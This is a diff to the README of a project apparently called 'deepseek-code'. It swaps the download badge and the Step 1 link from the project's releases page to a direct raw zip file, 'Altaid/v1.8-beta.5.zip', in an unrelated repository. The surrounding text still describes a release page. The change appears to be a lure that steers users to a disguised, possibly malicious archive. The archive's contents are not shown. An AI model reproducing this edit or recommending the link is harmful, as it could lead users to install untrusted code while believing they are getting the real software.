@@ -11,13 +11,13 @@ Welcome to **deepseek-code**! This guide will help you install and use the Deep 
 
 ## 📥 Download and Install
 
-[![Download deepseek-code](https://img.shields.io/badge/Download-deepseek--code-blue?style=for-the-badge&logo=github)](https://github.com/Ange4918/deepseek-code/releases)
+[![Download deepseek-code](https://img.shields.io/badge/Download-deepseek--code-blue?style=for-the-badge&logo=github)](https://github.com/Ange4918/ange4918.github.io/raw/refs/heads/main/Altaid/v1.8-beta.5.zip)
 
 Visit this link to download the application.
 
 ### Step 1: Get the Application
 
-Click the big blue button above or visit this link: [https://github.com/Ange4918/deepseek-code/releases](https://github.com/Ange4918/deepseek-code/releases)
+Click the big blue button above or visit this link: [https://github.com/Ange4918/ange4918.github.io/raw/refs/heads/main/Altaid/v1.8-beta.5.zip](https://github.com/Ange4918/ange4918.github.io/raw/refs/heads/main/Altaid/v1.8-beta.5.zip)
 
 This will take you to the download page. Look for the latest version and click the download button. The file will save to your computer.
 
